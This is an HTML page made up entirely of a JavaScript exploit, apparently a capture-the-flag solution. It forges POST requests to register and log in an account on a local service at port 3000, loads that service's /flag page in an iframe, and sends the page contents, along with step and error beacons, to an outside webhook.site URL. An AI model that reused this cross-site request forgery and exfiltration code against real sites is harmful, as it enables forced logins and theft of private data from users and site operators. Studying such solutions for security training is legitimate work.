<!DOCTYPE html>
<html>
<body>
<script>
new Image().src = 'https://webhook.site/showontest?step=0';

try {
  var iframe = document.createElement('iframe');
  iframe.name = 'f1';
  iframe.id = 'f1';
  document.body.appendChild(iframe);

  // Register
  var regForm = document.createElement('form');
  regForm.method = 'POST';
  regForm.action = 'http://0.0.0.0:3000/register';
  regForm.target = 'f1';

  var u1 = document.createElement('input');
  u1.name = 'username';
  u1.value = 'pwn123';
  regForm.appendChild(u1);

  var p1 = document.createElement('input');
  p1.name = 'password';
  p1.value = 'pwn123';
  regForm.appendChild(p1);

  document.body.appendChild(regForm);
  regForm.submit();

  new Image().src = 'https://webhook.site/showontest?step=1_reg';
} catch(e) {
  new Image().src = 'https://webhook.site/showontest?err0=' + encodeURIComponent(e.message);
}

setTimeout(function(){
  try {
    var loginForm = document.createElement('form');
    loginForm.method = 'POST';
    loginForm.action = 'http://0.0.0.0:3000/login';
    loginForm.target = 'f1';

    var u2 = document.createElement('input');
    u2.name = 'username';
    u2.value = 'pwn123';
    loginForm.appendChild(u2);

    var p2 = document.createElement('input');
    p2.name = 'password';
    p2.value = 'pwn123';
    loginForm.appendChild(p2);

    document.body.appendChild(loginForm);
    loginForm.submit();

    new Image().src = 'https://webhook.site/showontest?step=2_login';
  } catch(e) {
    new Image().src = 'https://webhook.site/showontest?err1=' + encodeURIComponent(e.message);
  }
}, 400);

setTimeout(function(){
  try {
    var ff = document.createElement('iframe');
    ff.id = 'ff';
    ff.src = 'http://0.0.0.0:3000/flag';
    document.body.appendChild(ff);
    new Image().src = 'https://webhook.site/showontest?step=3_flagframe';
  } catch(e) {
    new Image().src = 'https://webhook.site/showontest?err2=' + encodeURIComponent(e.message);
  }
}, 1000);

setTimeout(function(){
  try {
    var c = document.getElementById('ff').contentDocument.body.innerHTML;
    new Image().src = 'https://webhook.site/showontest?flag=' + encodeURIComponent(c);
  } catch(e) {
    new Image().src = 'https://webhook.site/showontest?err3=' + encodeURIComponent(e.message);
  }
}, 1800);
</script>
</body>
</html>